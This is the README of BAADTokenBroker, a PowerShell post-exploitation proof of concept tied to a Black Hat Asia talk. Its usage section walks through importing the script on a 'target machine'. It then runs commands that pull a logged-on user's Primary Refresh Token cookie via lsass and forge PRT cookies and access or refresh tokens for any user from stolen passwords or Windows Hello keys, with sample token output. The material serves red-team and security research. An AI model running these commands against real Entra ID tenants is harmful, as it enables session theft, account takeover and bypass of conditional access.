# BAADTokenBroker

BAADTokenBroker is a post-exploitation tool designed to leverage device-stored keys (Device key, Transport key etc..) to authenticate to Microsoft Entra ID.

https://www.blackhat.com/asia-24/briefings/schedule/index.html#bypassing-entra-id-conditional-access-like-apt-a-deep-dive-into-device-authentication-mechanisms-for-building-your-own-prt-cookie-37344

Note that this is a proof of concept tool. The tool is provided as is, without warranty of any kind.

## Usage

Import BAADTokenBroker in your target machine.

```
PS C:\ > import-module .\BAADTokenBroker.ps1
```

Then, execute whichever commands satisfy your needs.

- Request-PRTCookie: Request PRT Cookie of logged on user directly talking to lsass
- Create-PRTCookie: Create PRT Cookie of any user with their credentials or Windows Hello for Business (WHfB) keys
- Acquire-Token: Acquire access tokens and refresh tokens of any user with their credentials or WHfB keys

### Request-PRTCookie

Requests PRT Cookie of a logged-on user through LsaCallAuthenticationPackage

```
PS C:\> Request-PRTCookie
eyJhbGciOiJIUzI1NiIsICJrZGZfdmVyIjoyLCAiY3R4IjoiYTl0TVU4eitBbXluVWc1eHZZUkQrQSthaXNpQXNyclMifQ.eyJyZWZyZXNoX3Rva2VuIjoiMC5BVDBBN21SUVppwU25SWUIxU1ZqLUhnZDhBZ0RzX3dVQTlQOVp(redacted)llbnRfcGxhdGZvcm0iOiJ3aW5kb3dzIiwgInJlcXVFdJZmd6UTF5c3Zub2J4TWZycXFZclJ3bnFCSWdBQSJ9.okbIEJUopSjQ5ZKYvFd9aK5qCatVfk0oNNLD_L4NEQg
```

### Create-PRTCookie

Authenticates to Microsoft Entra ID and returns any user's PRT Cookie with their credentials

```
PS C:\>  Create-PRTCookie -Username employee01@*******.onmicrosoft.com -Password *********
eyJhbGciOiJIUzI1NiIsImtkZl92ZXIiOjIsImN0eCI6InY0algrcG1SbWlSQ3p5UFZnTDgxdDlLREJwbU5OZEpaIn0.ew0KICAgICJ4X2NsaWVudF9wbGF0Zm9ybSI6ICAid2luZG9W4iOiAgIjAuQVQwQTdtUlFaRzZiMjBPZFJ2NkJwb(redacted)GQ4N1lGU2hRcEJJa1BEMjVxTmZHYjRXa2RTVGJ2T1NkZ2doQ29vTlQlFEMF82SHZNOXZqdTFDaW9TZW9mLUpGVV9DYjZWcDlXN3pobmVMSHFSeFotb3dIVmNDQVg2OFMxNXNtZVl3OVYySDZIRFlzSllMVkNlN0g4YV85TVlCRGRFWWdBQSINCn0.DVMCeNGyTYTjsEMbHJtjmckkRYkb-VZ0GLceQYOvoIA
```

If you have access to WHfB keys configured user, you can also generate PRT Cookie of the user with their WHfB keys.

```
PS C:\>  Create-PRTCookie -Username employee01@*******.onmicrosoft.com -Whfb $True
eyJhbGciOiJIUzI1NiIsImtkZl92ZXIiOjIsImN0eCI6IkhOcmlXRlRBV1lsVFNDK3Z0T1FqcWcwclFBQnNOT083In0.ew0KIZG93cyIsDQogICAgIndpbl92ZXIiOiAgIjEwLjAuRLkFnQUJBQUVBQUFEbmZvbGhKcFNuUllCMVNWai1IZ2Q4QWdEc193VUE5UF9tQlJBVXNLTFhtbTdFRTV4NUplWlFKVlpEdD(redacted)zRzX0otWTI0ZmYtTEo1dS0wVXVQN2tQSjE5MW44QnFRR0l0RDBneXRFa285S2YwajU3bFRmcFJaU3lLYkRZZEZFaGs4aVFJNnBwaTV5ZFpoclUzSXFkUl9tYlpucW1NZ0FBIg0KfQ.BOlt7yiMYM47L6Z3awVH6zgW_B4xH-Ys8iv8HmY3XqM
```

### Acquire-Token

Authenticates to Microsoft Entra ID and returns access tokens and refresh tokens with supplied credentials or WHfB keys

```
PS C:\> $response = Acquire-Token -Username employee01@*******.onmicrosoft.com -Password ********* -Resource f2d19332-a09d-48c8-a53b-c49ae5502dfc -Clientid 29d9ed98-a469-4536-ade2-f981bc1d605e
PS C:\> $response.access_token
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InEtMjNmYWxldlpoaEQzaG05Q1Fia1A1TVF5VSIsImtpZCI6InEtMjNmYWxldlpoaEQzaG05Q1Fia1A1TVF5VSJ9.eyJhdWDlQzZGItOWQ0Ni1mZTgxYTY1Y2ZkZWEvIiwiaWF0Ij4LCJuYmYiOjE3MTE3MDk3MjgsImV4cCI6MTcxMTcxNDYyNSwiYWNyIjoiMiIsImFpbyI6IkFiUUFTLzhXQUFBQXN5K1BjUUZZZnpuK2tldUxEaXhyQ2h6TzB0Tm(redacted)pWZDBlZWY1cmp1VWdQQUEiLCJ2ZXIiOiIxLjAifQ.DaByirnDkLbsHLBVV2neoSVDjAdIXOcwVVlJIr6S-uBWzqjel3lvwPRZM8lvtoyLRqg3A4JoQt7nZc8TCB1L6s69Src33DC9woArh8PwcUaOguGnMJANV5s-qhfg8ot9yNkf9W24Bxg4LzlUnXsmZS5dfNOuhVkbfz2MJ9nm3b_qtNYK1fZpuuOLR49DByFWvGRw
```